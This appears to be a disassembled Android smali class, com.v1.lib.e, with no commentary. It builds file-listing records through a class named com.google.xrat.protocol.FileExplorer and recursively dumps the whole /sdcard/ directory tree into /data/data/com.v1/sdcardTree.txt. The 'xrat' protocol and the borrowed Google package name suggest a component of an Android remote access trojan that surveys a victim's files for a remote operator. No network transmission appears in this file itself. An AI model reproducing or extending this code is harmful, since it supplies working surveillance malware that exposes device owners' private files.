.class public final Lcom/v1/lib/e;
.super Ljava/lang/Object;


# static fields
.field private static a:Ljava/io/BufferedWriter;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/v1/lib/e;->a:Ljava/io/BufferedWriter;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static a(Ljava/lang/String;)Ljava/util/ArrayList;
    .locals 12

    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v3

    new-instance v0, Lcom/google/xrat/protocol/FileExplorer;

    invoke-direct {v0}, Lcom/google/xrat/protocol/FileExplorer;-><init>()V

    invoke-virtual {v0, p0}, Lcom/google/xrat/protocol/FileExplorer;->setFileName(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    if-eqz v3, :cond_0

    array-length v4, v3

    const/4 v0, 0x0

    move v1, v0

    :goto_0
    if-lt v1, v4, :cond_1

    :cond_0
    return-object v2

    :cond_1
    aget-object v5, v3, v1

    new-instance v6, Lcom/google/xrat/protocol/FileExplorer;

    invoke-direct {v6}, Lcom/google/xrat/protocol/FileExplorer;-><init>()V

    invoke-virtual {v5}, Ljava/io/File;->isDirectory()Z

    move-result v0

    invoke-virtual {v6, v0}, Lcom/google/xrat/protocol/FileExplorer;->setDir(Z)V

    invoke-virtual {v5}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Lcom/google/xrat/protocol/FileExplorer;->setFileName(Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/io/File;->isDirectory()Z

    move-result v0

    if-nez v0, :cond_5

    invoke-virtual {v5}, Ljava/io/File;->length()J

    move-result-wide v7

    new-instance v0, Ljava/text/DecimalFormat;

    const-string v9, "#.00"

    invoke-direct {v0, v9}, Ljava/text/DecimalFormat;-><init>(Ljava/lang/String;)V

    const-wide/16 v9, 0x400

    cmp-long v9, v7, v9

    if-gez v9, :cond_2

    new-instance v9, Ljava/lang/StringBuilder;

    long-to-double v7, v7

    invoke-virtual {v0, v7, v8}, Ljava/text/DecimalFormat;->format(D)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v9, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "B"

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :goto_1
    invoke-virtual {v6, v0}, Lcom/google/xrat/protocol/FileExplorer;->setFileSize(Ljava/lang/String;)V

    :goto_2
    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v7, "yyyy-MM-dd hh:mm:ss"

    invoke-direct {v0, v7}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v7, Ljava/util/Date;

    invoke-virtual {v5}, Ljava/io/File;->lastModified()J

    move-result-wide v8

    invoke-direct {v7, v8, v9}, Ljava/util/Date;-><init>(J)V

    invoke-virtual {v0, v7}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Lcom/google/xrat/protocol/FileExplorer;->setModifyTime(Ljava/lang/String;)V

    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_0

    :cond_2
    const-wide/32 v9, 0x100000

    cmp-long v9, v7, v9

    if-gez v9, :cond_3

    new-instance v9, Ljava/lang/StringBuilder;

    long-to-double v7, v7

    const-wide/high16 v10, 0x4090000000000000L

    div-double/2addr v7, v10

    invoke-virtual {v0, v7, v8}, Ljava/text/DecimalFormat;->format(D)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v9, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "K"

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_1

    :cond_3
    const-wide/32 v9, 0x40000000

    cmp-long v9, v7, v9

    if-gez v9, :cond_4

    new-instance v9, Ljava/lang/StringBuilder;

    long-to-double v7, v7

    const-wide/high16 v10, 0x4130000000000000L

    div-double/2addr v7, v10

    invoke-virtual {v0, v7, v8}, Ljava/text/DecimalFormat;->format(D)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v9, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "M"

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_1

    :cond_4
    new-instance v9, Ljava/lang/StringBuilder;

    long-to-double v7, v7

    const-wide/high16 v10, 0x41d0000000000000L

    div-double/2addr v7, v10

    invoke-virtual {v0, v7, v8}, Ljava/text/DecimalFormat;->format(D)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v9, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "G"

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_1

    :cond_5
    const-string v0, ""

    invoke-virtual {v6, v0}, Lcom/google/xrat/protocol/FileExplorer;->setFileSize(Ljava/lang/String;)V

    goto/16 :goto_2
.end method

.method private b(Ljava/lang/String;)V
    .locals 5

    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v2

    if-nez v2, :cond_1

    :cond_0
    return-void

    :cond_1
    const/4 v0, 0x0

    :goto_0
    array-length v1, v2

    if-ge v0, v1, :cond_0

    :try_start_0
    aget-object v1, v2, v0

    invoke-virtual {v1}, Ljava/io/File;->isDirectory()Z

    move-result v1

    if-eqz v1, :cond_3

    sget-object v1, Lcom/v1/lib/e;->a:Ljava/io/BufferedWriter;

    new-instance v3, Ljava/lang/StringBuilder;

    aget-object v4, v2, v0

    invoke-virtual {v4}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    :goto_1
    sget-object v1, Lcom/v1/lib/e;->a:Ljava/io/BufferedWriter;

    const-string v3, "\r\n"

    invoke-virtual {v1, v3}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_2
    aget-object v1, v2, v0

    invoke-virtual {v1}, Ljava/io/File;->isDirectory()Z

    move-result v1

    if-eqz v1, :cond_2

    aget-object v1, v2, v0

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1}, Lcom/v1/lib/e;->b(Ljava/lang/String;)V

    :cond_2
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_3
    :try_start_1
    sget-object v1, Lcom/v1/lib/e;->a:Ljava/io/BufferedWriter;

    aget-object v3, v2, v0

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2
.end method


# virtual methods
.method public final a()Ljava/lang/String;
    .locals 4

    :try_start_0
    new-instance v0, Ljava/io/BufferedWriter;

    new-instance v1, Ljava/io/FileWriter;

    new-instance v2, Ljava/io/File;

    const-string v3, "/data/data/com.v1/sdcardTree.txt"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {v1, v2}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    invoke-direct {v0, v1}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    sput-object v0, Lcom/v1/lib/e;->a:Ljava/io/BufferedWriter;

    const-string v0, "/sdcard/"

    invoke-direct {p0, v0}, Lcom/v1/lib/e;->b(Ljava/lang/String;)V

    sget-object v0, Lcom/v1/lib/e;->a:Ljava/io/BufferedWriter;

    invoke-virtual {v0}, Ljava/io/BufferedWriter;->flush()V

    sget-object v0, Lcom/v1/lib/e;->a:Ljava/io/BufferedWriter;

    invoke-virtual {v0}, Ljava/io/BufferedWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const-string v0, "/data/data/com.v1/sdcardTree.txt"

    return-object v0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method
